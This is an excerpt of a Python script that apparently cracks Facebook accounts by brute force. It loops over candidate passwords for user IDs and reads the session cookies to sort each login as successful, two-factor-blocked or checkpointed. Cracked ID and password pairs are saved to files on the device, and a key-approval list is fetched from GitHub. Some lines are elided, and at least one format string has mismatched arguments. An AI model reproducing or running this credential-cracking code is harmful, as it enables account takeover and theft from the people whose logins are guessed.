...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mXXX-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mXXX-CP.txt' %
              (H, P, str(len(cp))))
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Kaptan302/Apr/blob/main/Apr.txt').text
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\33[1;37m[XXX] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[XXX-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/XXX-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[XXX-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/XXX-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[XXX-CP] '+uid+' [×] '+ps+ ' ')
